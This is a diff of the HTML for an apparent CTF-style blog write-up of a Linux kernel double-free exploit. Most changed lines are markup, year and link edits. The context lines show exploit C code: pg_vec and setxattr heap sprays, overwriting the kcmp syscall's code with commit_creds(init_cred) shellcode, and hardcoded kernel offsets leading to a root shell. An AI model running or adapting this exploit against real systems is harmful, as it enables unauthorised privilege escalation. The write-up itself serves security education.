-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spray pg_vec</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spray pg_vec
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spray pg_vec</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PGVECS; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        pgvecs[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">spray_pg_vec</span>(<span style="color:#ae81ff">256</span>); 
 </span></span><span style="display:flex;"><span>    }
@@ -896,31 +896,31 @@
 </span></span></code></pre></div><p>This is how the successful pg_vec spray looks like in memory:</p>
 <p><img src="/images/dead-pwners-society/pg_vec-spray.jpg" alt="pg_vec spray"></p>
 <p>Now, it is time to perform the second free of the double free, and overwrite the pg_vec array. We will target the kcmp syscall, so we have to prep our second setxattr spray so that it contains an array of page-aligned kernel code pointers:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Setup the second setxattr spray
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setup setxattr heap spray 2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Setup the second setxattr spray
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Setup setxattr heap spray 2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_SETXATTR; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>thread2[i], NULL, setxattr_worker2, NULL);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Prepare block_map2 data (to overwrite pg_vec)
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    target_addr <span style="color:#f92672">=</span> block_map2<span style="color:#f92672">-</span><span style="color:#ae81ff">200</span>;
+</span></span></span><span style="display:flex;"><span>    target_addr <span style="color:#f92672">=</span> block_map2<span style="color:#f92672">-</span><span style="color:#ae81ff">200</span>;
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">200</span><span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        ((<span style="color:#66d9ef">uint64_t</span><span style="color:#f92672">*</span>)target_addr)[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)((<span style="color:#66d9ef">uintptr_t</span>)kcmp <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>(<span style="color:#66d9ef">uintptr_t</span>)<span style="color:#ae81ff">0xFFF</span>) <span style="color:#f92672">+</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">*</span> i); 
 </span></span><span style="display:flex;"><span>    }
 </span></span></code></pre></div><p>Next, we will release the first setxattr spray to free the victim object by writing one byte into the socketpair, which will cause FUSE to unblock. Following which, we can perform the second setxattr spray to overwrite pg_vec:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Release setxattr spray to get second free
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Releasing setxattr spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#75715e">// Release setxattr spray to get second free
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Releasing setxattr spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">write</span>(fuse_pipe1[<span style="color:#ae81ff">1</span>], <span style="color:#e6db74">&#34;A&#34;</span>, <span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>); 
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Spray second setxattr spray
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying second setxattr spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Spraying second setxattr spray</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    spray2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">2</span>); 
 </span></span></code></pre></div><p>This is how the pg_vec array looks like in memory after it has been overwritten by the second setxattr spray:</p>
 <p><img src="/images/dead-pwners-society/setxattr-second.jpg" alt="Second setxattr spray"></p>
 <p>At this point, we can prepare the shellcode that we want to use to overwrite the code section corresponding to the kcmp syscall:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">/*
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">/*
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    mov rdi, init_cred
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    mov rax, commit_creds
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">    call rax
@@ -935,13 +935,13 @@
 </span></span><span style="display:flex;"><span>};
 </span></span><span style="display:flex;"><span>...
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// In main()
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Preparing shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+</span></span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Preparing shellcode</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    init_cred <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1c567e0</span>; 
 </span></span><span style="display:flex;"><span>    commit_creds <span style="color:#f92672">=</span> kernel_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xe1460</span>; 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(shellcode<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>, <span style="color:#f92672">&amp;</span>init_cred, <span style="color:#ae81ff">8</span>);
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(shellcode<span style="color:#f92672">+</span><span style="color:#ae81ff">14</span>, <span style="color:#f92672">&amp;</span>commit_creds, <span style="color:#ae81ff">8</span>);
 </span></span></code></pre></div><p>Now, it is time to perform the mmap, and patch the kcmp syscall with our shellcode and profit! 🤑</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Perform mmap</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-C" data-lang="C"><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Perform mmap</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>); 
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> NUM_PGVECS; i<span style="color:#f92672">++</span>) {
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>pgvecs[i]) {
 </span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">continue</span>;
@@ -1042,7 +1042,7 @@ root@libraryserver:/# :D I AM ROOT
 
     Kaligula Armblessed
 
-<span id="thisyear">2025</span>
+<span id="thisyear">2026</span>
 
 
         | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
@@ -1050,7 +1050,7 @@ root@libraryserver:/# :D I AM ROOT
 </p>
     <p class="text-center">
         
-        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        <a href="https://x.com/KaligulaSec">Twitter</a> 
         
         <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
         
